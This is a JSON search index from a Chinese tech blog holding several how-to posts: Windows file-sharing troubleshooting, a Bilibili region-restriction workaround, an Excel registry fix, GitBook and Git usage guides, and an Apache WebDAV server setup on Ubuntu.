sponsored_torrent_offer_enabled（顶部栏广告）\n- offers.left_rail_offer_enabled/left_rail_offer （左下角广告栏）\n- gui.show_plus_upsell（左下角升级到高级版的提示）","tags":["uTorrent"],"categories":["日常"]},{"title":"排除文件共享故障","url":"/20200126/02791a3f61ff/","content":"\n“文件共享”（Sharing）是被使用最多的网络远程文件访问功能，却也是最容易出问题的一部分，许多用户在使用一些优化工具后，发现文件共享功能突然就失效了，或者无论如何都无法成功共享文件，这也是很多网络管理员要面对的棘手问题，如果你也不巧遇到了，那么可以尝试检查以下几种原因：\n\n1. 相应的服务被禁止。\n   - 文件共享功能依赖于这4个服务：Computer Browser、TCP/IP NetBIOS Helper Service、Server、Workstation，如果它们的其中一个被禁止了，文件共享功能就会出现各种古怪问题如不能通过计算机名访问等，甚至完全不能访问。\n2. 内置来宾账户组成员Guest未启用。\n   - 文件共享功能需要使用Guest权限访问网络资源。\n3. 内置来宾账户组成员Guest被禁止从网络访问。\n   - 这问题常见于XP系统，因为它在组策略（gpedit.msc）->计算机配置->Windows设置->安全设置->本地策略->用户权利指派->拒绝从网络访问这台计算机里把Guest账户添加进去了，删除掉即可真正启用Guest远程访问权限。\n4. 限制了匿名访问的权限。\n   - 默认情况下，组策略（gpedit.msc）->计算机配置->Windows设置->安全设置->本地策略->安全选项->对匿名连结的额外限制的设置应该是“无。依赖于默认许可权限”或者“不允许枚举SAM账号和共享”，如果有工具自作聪明帮你把它设置为“没有显式匿名权限就无法访问”，那么我可以很负责的告诉你，你的共享全完蛋了。\n5. 系统权限指派出现意外。\n   - 默认情况下，系统会给共享目录指派一个“Everyone”账户访问授权，然而实际上它还是要使用Guest成员完成访问的工作，但是有时候，Everyone却忘记Guest的存在了，这是或我们就需要自己给共享目录手动添加一个Guest账户，才能完成远程访问。（图.手动添加一个账户权限）\n6. NTFS权限限制。\n   - 一些刚接触NTFS的用户或者新手管理员经常会出这个差错，在排除以上所有问题的前提下依然无法实现文件共享，哪里都碰过了就是偏偏不知道来看看这个目录的“安全”选项卡，并在里面设置好Everyone的相应权限和添加一个Guest权限进去。\n\n———————————–\n\n## 故障排除\n\n1. 启用来宾帐户。\n   - “控制面板-用户帐户-启用来宾帐户”   \n2. 安装NetBEUI协议。\n   - 查看“网上邻居”属性——查看“本地连接”属性——点击“安装”——查看 “协议”——看其中NetBEUI协议是否存在，如果存在则安装这个协议，如果不存在则表明已经安装了该协议，在Winxp系统默认的情况下该协议是已经安装好了的。\n3. 查看本地安全策略设置是否禁用了GUEST账号。\n   - 控制面板——管理工具——本地安全策略——用户权利指派——查看“拒绝从网络访问这台计算机”项的属性——看里面是否有GUEST帐户，如果有就把它删除掉。\n4. 设置共享文件夹。\n   - 你如果不设置共享文件夹的话，网内的其它机器无法访问到你的机器。设置文件夹共享的方法有三种：\n     1. “工具－－文件夹选项－－查看－－使用简单文件夹共享”。这样设置后，其他用户只能以Guest用户的身份访问你共享的文件或者是文件夹。\n     2. “控制面板－－管理工具－－计算机管理”，在“计算机管理”这个对话框中，依次点击“文件夹共享－－共享”，然后在右键中选择“新建共享”即可。\n     3. 直接在你想要共享的文件夹上点击右键,通过“共享和安全”选项即可设置共享。\n5. 建立工作组。\n   - 在Windows桌面上用右键点击“我的电脑”，选择“属性”，然后单击“计算机名”选项卡，看看该选项卡中有没有出现你的局域网工作组名称，如“workgroup”等。然后单击“网络 ID”按钮，开始“网络标识向导”：单击“下一步”，选择“本机是商业网络的一部分，用它连接到其他工作着的计算机”；单击“下一步”，选择“公司使用没有域的网络”；单击“下一步”按钮，然后输入你的局域网的工作组名，这里我建议大家用“BROADVIEW”，再次单击“下一步”按钮，最后单击“完成”按钮完成设置。\n   - 重新启动计算机后，局域网内的计算机就可以互访了。\n6. 查看“计算机管理”是否启用来宾帐户。  \n   - 控制面版——计算机管理——本地用户和组——用户——启用来宾帐户。机器重新启动后就可以了。\n   - 如果大家想提高访问别人机器的速度的话，还可以做一些相关操作：控制面版——管理工具——服务——Task Scheduler——属性——启动方式改为手动，这样就可以了。\n7. 用户权利指派。\n   - “控制面板－－管理工具－－本地安全策略”，在“本地安全策略”对话框中，依次选择“本地策略－－用户权利指派”，在右边的选项中依次对“从网络上访问这台计算机”和“拒绝从网络上访问这台计算机”这两个选项进行设置。\n   -  “从网络上访问这台计算机”选项需要将guest用户和everyone添加进去；“拒绝从网络上访问这台计算机”需要将被拒绝的所有用户删除掉，默认情况下guest是被拒绝访问的。\n\n上述方法的所有步骤并不是设置局域网都必须进行的，因为有些步骤在默认情况下已经设置。但是只要你的局域网出现了不能访问的现象，通过上述设置肯定能保证局域网的畅通.","tags":["Windows","文件共享"],"categories":["日常"]},{"title":"解除B站区域限制","url":"/20200126/6e2efaa31272/","content":"\n有的番由于某些原因，例如大陆禁播啦～版权被其他网站抢啦～B站的思路也是有意思，就买台湾地区的版权，大陆要看还得绕一圈\n\n## 方法一 ：安装浏览器脚本（PC）\n\n这个比较方便，去[下脚本的地方](https://greasyfork.org/zh-CN/scripts/25718-解除b站区域限制)，根据提示，先安装对应浏览器的脚本扩展：tampermonkey\n\n![img](image-3.png)\n\n安装扩展\n\n扩展装好后就可以安装脚本了，第一次打开B站网页会提示授权啥的，同意下就好了\n\n## 方法二： 挂VPN\n\n这招虽然最稳，但是比较蛋疼的是得挂台湾的VPN，偏偏我用的SS没有台湾节点，墙都翻出去了，还看不到，淡淡的忧伤啊QAQ，所以要挂VPN的朋友注意看有没有台湾节点哈（从弹幕截图来看，倒是都在推荐天行和green这俩VPN，想试试的可以去看看）","tags":["Bilibili"],"categories":["日常"]},{"title":"打开excel报文件格式或文件扩展名无效的错误","url":"/20200126/46cdabd38a24/","content":"\n前段时间测试了一下WPS，试完之后，把WPS卸载了，但是之后通过右键新建的 Microsoft Excel 工作表，再打开后提示如下：\n\n```\n Excel无法打开文件，因为文件格式或文件扩展名无效，请确定文件未损坏，并且文件扩展名与文件格式匹配。\n```\n\n![](aHR0cHM6Ly9jZG4uYmFpanVueWFvLmNvbS91cGxvYWRzL2FydGljbGUvMjAxODExMTEvNWJlODUwZTg5YmZiZC5wbmc.png)\n\n\n原因是之前同时安装了 office 和 wps ；\n后来把 wps 卸载了；\n伴随还可能出现的问题是 excel 文件的图标成空白了；\n\n 需要修改注册表，按下win+R，输入regedit\n\n![](aHR0cHM6Ly9jZG4uYmFpanVueWFvLmNvbS91cGxvYWRzL2FydGljbGUvMjAxODExMTEvNWJlODUxMDlkYWYyZi5wbmc.png)\n\n\n导航到 `HKEY_CLASSES_ROOT\\.xlsx\\ET.Xlsx.6\\ShellNew`\n \n\n![](aHR0cHM6Ly9jZG4uYmFpanVueWFvLmNvbS91cGxvYWRzL2FydGljbGUvMjAxODExMTEvNWJlODUxMmU0NDJmNC5wbmc.png)\n\n\n我们可以看到此处是 WPS ，然而 WPS 已经被卸载了， 我们把这个改成 office 的即可：\n\n- 双击 `FileName` ；\n- 输入 `C:\\Program Files (x86)\\Microsoft\\Office\\root\\VFS\\Windows\\SHELLNEW\\EXCEL12.XLSX` ；\n- 对于64位的office，更改为 `C:\\Program Files\\Microsoft Office\\root\\VFS\\Windows\\SHELLNEW\\EXCEL12.XLSX` ;\n\n.xls 格式同理；","tags":["Excel"],"categories":["Office"]},{"title":"gitbook 使用入门","url":"/20200101/6ad4cb1b7431/","content":"\n[GitBook 官网](https://www.gitbook.com/)\n\n[GitBook 文档](https://github.com/GitbookIO/gitbook)\n\n## GitBook 准备工作\n\n### 安装 Node.js\n\nGitBook 是一个基于 Node.js 的命令行工具，下载安装 Node.js，安装完成之后，你可以使用下面的命令来检验是否安装成功。\n\n```\n$ node -v\nv7.7.1\n```\n\n### 安装 GitBook\n\n输入下面的命令来安装 GitBook。\n\n> $ npm install gitbook-cli -g\n\n安装完成之后，你可以使用下面的命令来检验是否安装成功。\n\n```\n$ gitbook -V\nCLI version: 2.3.2\nGitBook version: 3.2.3\n```\n\n更多详情请参照 [GitBook 安装文档](https://github.com/GitbookIO/gitbook/blob/master/docs/setup.md) 来安装 GitBook。\n\n### 安装 GitBook 编辑器\n\n去 GitBook 官网 下载 GitBook 编辑器；如果是 Mac 用户且安装过 `brew cask` 的话可以使用 `brew cask install gitbook-editor` 命令行来安装 GitBook 编辑器。\n\n## 先睹为快\n\nGitBook 准备工作做好之后，我们进入一个你要写书的目录，输入如下命令。\n\n```\n$ gitbook init\nwarn: no summary file in this book\ninfo: create README.md\ninfo: create SUMMARY.md\ninfo: initialization is finished\n```\n\n可以看到他会创建 README.md 和 SUMMARY.md 这两个文件，README.md 应该不陌生，就是说明文档，而 SUMMARY.md 其实就是书的章节目录，其默认内容如下所示：\n\n```\n# Summary\n\n* [Introduction](README.md)\n```\n\n接下来，我们输入`$ gitbook serve` 命令，然后在浏览器地址栏中输入`http://localhost:4000` 便可预览书籍。\n\n运行该命令后会在书籍的文件夹中生成一个 `_book` 文件夹, 里面的内容即为生成的 html 文件，我们可以使用下面命令来生成网页而不开启服务器。\n\n> gitbook build\n\n下面我们来详细介绍下 GitBook 目录结构及相关文件。\n\n### 目录结构\n\nGitBook 基本的目录结构如下所示：\n\n```\n.\n├── book.json\n├── README.md\n├── SUMMARY.md\n├── chapter-1/\n|   ├── README.md\n|   └── something.md\n└── chapter-2/\n    ├── README.md\n    └── something.md\n```\n\n#### SUMMARY.md\n\n这个文件主要决定 GitBook 的章节目录，它通过 Markdown 中的列表语法来表示文件的父子关系，下面是一个简单的示例：\n\n```\n# Summary\n\n* [Introduction](README.md)\n* [Part I](part1/README.md)\n    * [Writing is nice](part1/writing.md)\n    * [GitBook is nice](part1/gitbook.md)\n* [Part II](part2/README.md)\n    * [We love feedback](part2/feedback_please.md)\n    * [Better tools for authors](part2/better_tools.md)\n```\n\n这个配置对应的目录结构如下所示:\n\n![img](1944467-de97699c5919469e.jpg)\n\n我们通过使用 标题 或者 水平分割线 将 GitBook 分为几个不同的部分，如下所示：\n\n```\n# Summary\n\n### Part I\n\n* [Introduction](README.md)\n* [Writing is nice](part1/writing.md)\n* [GitBook is nice](part1/gitbook.md)\n\n### Part II\n\n* [We love feedback](part2/feedback_please.md)\n* [Better tools for authors](part2/better_tools.md)\n\n---\n\n* [Last part without title](part3/title.md)\n```\n\n这个配置对应的目录结构如下所示:\n\n![img](1944467-e80d5e46997e5eb4.jpg)\n\n### 插件\n\nGitBook 有 插件官网，默认带有 5 个插件，highlight、search、sharing、font-settings、livereload，如果要去除自带的插件， 可以在插件名称前面加 -，比如：\n\n```\n\"plugins\": [\n    \"-search\"\n]\n```\n\n如果要配置使用的插件可以在 book.json 文件中加入即可，比如我们添加 plugin-github，我们在 book.json 中加入配置如下即可：\n\n```\n{\n    \"plugins\": [ \"github\" ],\n    \"pluginsConfig\": {\n        \"github\": {\n            \"url\": \"https://github.com/your/repo\"\n        }\n    }\n}\n```\n\n然后在终端输入`gitbook install ./` 即可。\n如果要指定插件的版本可以使用 `plugin@0.3.1`，因为一些插件可能不会随着 GitBook 版本的升级而升级。\n\n## 导出pdf文件\n\n安装[calibre-ebook](https://calibre-ebook.com/)和`ebook-convert`：\n\n> npm install ebook-convert -g\n\n然后再执行转换\n\n- windows 下\n\n> gitbook pdf `[被转换目录]` `[转换后的文件名]`\n\n- linux下\n  linux下转换需要退回到上一层目录\n\n> gitbook pdf [被转换目录]","tags":["gitbook"],"categories":["运维"]},{"title":"Git配置指南","url":"/20200101/9b4ae4eeeaca/","content":"\n## 安装\n\n> sudo apt-get install git git-core\n\n## 初始配置\n\n- 用户信息 配置个人的用户名称和电子邮件地址：\n\n> $ git config –global user.name “runoob”\n>\n> $ git config –global user.email test@runoob.com\n\n- 文本编辑器\n\n> $ git config –global core.editor vim\n\n- 差异分析工具\n\n> $ git config –global merge.tool vimdiff\n\n- 检查已有的配置信息\n\n> git config –list\n\n## 命令\n\n### git diff\n\n执行 git diff 来查看执行 git status 的结果的详细信息。git diff 命令显示已写入缓存与已修改但尚未写入缓存的改动的区别。\n\n- 尚未缓存的改动：git diff\n- 查看已缓存的改动： git diff –cached\n- 查看已缓存的与未缓存的所有改动：git diff HEAD\n- 显示摘要而非整个 diff：git diff –stat\n\n### Git log 查看提交历史\n\n在使用 Git 提交了若干更新之后，又或者克隆了某个项目，想回顾下提交历史，我们可以使用 git log 命令查看。\n针对我们前一章节的操作，使用 git log 命令列出历史提交记录如下：\n\n> $ git log\n\n***参数：\\***\n\n- `--oneline`选项来查看历史记录的简洁的版本。\n\n> $ git log –oneline\n\n- `--graph` 选项，查看历史中什么时候出现了分支、合并。以下为相同的命令，开启了拓扑图选项：\n\n> $ git log –oneline –graph\n\n- `--reverse`参数来逆向显示所有日志。\n\n> $ git log –reverse –oneline\n\n查找指定用户的提交日志可以使用命令：`git log --author` , 例如，比方说我们要找 Git 源码中 Linus 提交的部分：\n\n> $ git log –author=Linus –oneline -5\n\n如果你要指定日期，可以执行几个选项：–since 和 –before，但是你也可以用 –until 和 –after。\n例如，如果我要看 Git 项目中三周前且在四月十八日之后的所有提交，我可以执行这个（我还用了 –no-merges 选项以隐藏合并提交）：\n\n> $ git log –oneline –before={3.weeks.ago} –after={2010-04-18} –no-merges\n\n### Git tag 标签\n\n如果你达到一个重要的阶段，并希望永远记住那个特别的提交快照，你可以使用 git tag 给它打上标签。\n\n比如说，我们想为我们的 w3cschoolcc 项目发布一个”1.0″版本：\n\n> $ git tag -a v1.0\n\n选项：\n\n- -a 选项意为”创建一个带注解的标签”。不用 -a 选项也可以执行的，但它不会记录这标签是什么时候打的，谁打的，也不会让你添加个标签的注解。\n\n#### 追加标签\n\n如果我们忘了给某个提交打标签，又将它发布了，我们可以给它追加标签。例如，假设我们发布了提交 85fc7e7，但是那时候忘了给它打标签。 我们现在也可以：\n\n> $ git tag -a v0.9 85fc7e7\n\n#### 指定标签信息命令：\n\n> git tag -a -m “w3cschool.cc标签”\n\n#### PGP签名标签命令：\n\n> git tag -s -m “w3cschool.cc标签”\n\n### Git 远程仓库(Github)\n\n#### 添加远程库\n\n> git remote add [shortname] [url]\n\n由于本地Git仓库和GitHub仓库之间的传输是通过SSH加密的，所以我们需要配置验证信息：\n使用以下命令生成SSH Key：\n\n> $ ssh-keygen -t rsa -C “youremail@example.com”\n\n成功的话会在~/下生成.ssh文件夹，进去，打开 id_rsa.pub，复制里面的 key。\n回到 github 上，进入 Account => Settings（账户配置）。\n\n左边选择 SSH and GPG keys，然后点击 New SSH key 按钮,title 设置标题，可以随便填，粘贴在你电脑上生成的 key。\n\n- 查看当前的远程库\n\n> git remote\n\n- 配置上游分支\n\n> git push –set-upstream [repo] [branch]\n\n- 提取远程仓库\n\n1. 从远程仓库下载新分支与数据：\n\n> git fetch\n\n该命令执行完后需要执行git merge 远程分支到你所在的分支。\n\n2.从远端仓库提取数据并尝试合并到当前分支：\n\n> git pull\n\n#### 推送到远程仓库\n\n推送你的新分支与数据到某个远端仓库命令:\n\n> git push [alias] [branch]\n\n#### 删除远程仓库\n\n删除远程仓库你可以使用命令：\n\n> git remote rm [别名]","tags":["git"],"categories":["运维"]},{"title":"搭建一个webdav服务器","url":"/20200101/3c0c0d4f2c40/","content":"\n## 简介\n\nwebdav是“Web-based Distributed Authoring and Versioning”的简称。作为FTP的代替，在局域网内便捷地共享、传输文件。本文简单介绍在ubuntu/debian上搭建webdav服务器。\n\n## 安装\n\n1. 安装Apache2服务器\n\n```\n   sudo apt install apache2\n```\n\n1. 测试工具cadaver*: cadaver是一款命令行下的webdav工具\n\n```\n   sudo apt install cadaver\n```\n\n## 配置\n\n1. 启用相关模块\n\n```\n   sudo a2enmod dav_fs\n   //启用dav_fs时会自动启用dav模块\n   sudo a2enmod dav_lock\n```\n\n1. 重启 Apache2 服务:\n\n```\n   sudo service apache2 restart\n```\n\n1. 创建虚拟主机目录:\n\n```\n   mkdir /media/data\n   chown www-data:www-data /media/data\n```\n\n1. 创建用户:\n\n```\n   sudo htpasswd -c /media/me.dav sergget\n   // 这里会要求你设置密码，后面登录时会用到，用户名即为 sergget\n   sudo chown root:www-data /media/me.dav\n   sudo chmod 640 /media/me.dav\n```\n\n1. 配置虚拟主机:\n\n```\n   sudo vim /etc/apache2/sites-available/webdav.conf\n```\n\n在文件中插入以下内容并保存\n\n```\n   <VirtualHost *:80>\n           ServerAdmin webmaster@localhost\n           DocumentRoot /media/data/\n           <Directory /media/data/>\n                   Options Indexes MultiViews\n                   AllowOverride None\n                   Require all granted\n           </Directory>\n\n           Alias /webdav /media/data\n\n           <Location /webdav>\n              DAV On\n              AuthType Basic\n              AuthName \"webdav\"\n              AuthUserFile /media/me.dav\n              Require valid-user\n          </Location>\n   </VirtualHost>\n```\n\n到Apache2下链接配置文件：\n\n```\n   cd /etc/apache2/sites-enabled/\n   sudo ln -s ../sites-available/webdav.conf webdav.conf\n   sudo rm 000-default.conf\n```\n\n配置完成后重启apache2服务使配置生效\n\n```\n   sudo service apache2 restart\n```\n\n## 验证\n\n使用命令行 cadaver 进入登录\n\n```\ncadaver http://127.0.0.1/webdav/\n```","tags":["webdav","apache","linux"],"categories":["运维"]}]